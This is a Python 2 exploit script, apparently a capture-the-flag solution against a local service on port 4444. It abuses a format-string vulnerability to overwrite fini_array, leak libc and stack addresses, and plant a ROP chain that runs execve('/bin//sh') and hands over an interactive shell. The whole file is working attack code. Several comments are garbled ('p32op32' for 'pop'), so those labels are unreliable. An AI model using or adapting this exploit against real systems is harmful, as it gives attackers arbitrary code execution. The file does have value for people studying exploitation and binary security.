# -*- coding: utf-8 -*-
from m1z0r3 import *
from libformatstr import FormatStr

HOST = "localhost"
PORT = 4444

s,f = sock(HOST,PORT)

index = 7
fini_array = 0x80496dc
main = 0x804849b

offset_got_start = 0x80497ec
offset_retaddr_from_buf = (0x5d0-0x1b0)/4

buf = p32(offset_got_start)
buf += "%7$s"
buf += "%"+str(offset_retaddr_from_buf)+"$08x"

p = FormatStr()
p[fini_array] = main
s.send(buf+p.payload(index+len(buf)/4,start_len=len(buf))+"\n")
read_until(f,"RESPONSE :")

ret_addr = s.recv(16)
libc_start_addr = u32(ret_addr[4:8])
offset_libc_start_main = 0x19990
base_libc = libc_start_addr - offset_libc_start_main
buf_addr = int(ret_addr[8:],16) - (0x5f0-0x1b0)

print "[+] libc base addr %08x" % base_libc
print "[+] buf addr %08x" % buf_addr

# ここからROP
data_addr = 0x80497f0
p = FormatStr()
ret_addr = buf_addr + (0x5ec-0x1b0-0xe0)
print "[+] ret_addr %08x" % ret_addr
# "/bin"
p[ret_addr] = p32(base_libc + 0x00026b0f) # pop eax; ret;
p[ret_addr+4] = p32(data_addr)
p[ret_addr+8] = p32(base_libc + 0x000ec0f3) # pop ecx; ret;
p[ret_addr+12] = "/bin"
p[ret_addr+16] = p32(base_libc + 0x0002dc1f) # mov [eax] ecx; ret;

# "//sh"
p[ret_addr+20] = p32(base_libc + 0x00026b0f) # p32op32 eax; ret;
p[ret_addr+24] = p32(data_addr + 4)
p[ret_addr+28] = p32(base_libc + 0x000ec0f3) # p32op32 ecx; ret;
p[ret_addr+32] = "//sh"
p[ret_addr+36] = p32(base_libc + 0x0002dc1f) # mov [eax] ecx; ret;

# null
p[ret_addr+40] = p32(base_libc + 0x00001aa2) # p32op32 edx; ret;
p[ret_addr+44] = p32(data_addr + 8 - 4)
p[ret_addr+48] = p32(base_libc + 0x0002f06c) # xor eax, eax; ret;
p[ret_addr+52] = p32(base_libc + 0x000e5229) # mov [edx+0x04] eax; ret;

# ["/bin//sh",NULL]
p[ret_addr+56] = p32(base_libc + 0x00026b0f) # p32op32 eax; ret;
p[ret_addr+60] = p32(data_addr + 12)
p[ret_addr+64] = p32(base_libc + 0x000ec0f3) # p32op32 ecx; ret;
p[ret_addr+68] = p32(data_addr)
p[ret_addr+72] = p32(base_libc + 0x0002dc1f) # mov [eax] ecx; ret;

p[ret_addr+76] = p32(base_libc + 0x00001aa2) # p32op32 edx; ret;
p[ret_addr+80] = p32(data_addr + 16 - 4)
p[ret_addr+84] = p32(base_libc + 0x0002f06c) # xor eax, eax; ret;
p[ret_addr+88] = p32(base_libc + 0x000e5229) # mov [edx+0x04] eax; ret;

# set eax, edx
p[ret_addr+92] = p32(base_libc + 0x00082004) # xor edx edx; mov eax edx; ret;
p[ret_addr+96] = p32(base_libc + 0x00088a5e) # lea eax [edx+0x0B]; ret;

# set ebx
p[ret_addr+100] = p32(base_libc + 0x000198ce) # pop ebx; ret;
p[ret_addr+104] = p32(data_addr)

# set ecx
p[ret_addr+108] = p32(base_libc + 0x000ec0f3) # pop ecx; ret;
p[ret_addr+112] = p32(data_addr + 12)

# int 0x80
p[ret_addr+116] = p32(base_libc + 0x0002e6a5) # int 0x80;

s.send(p.payload(index,start_len=0)+"\n")
shell(s)
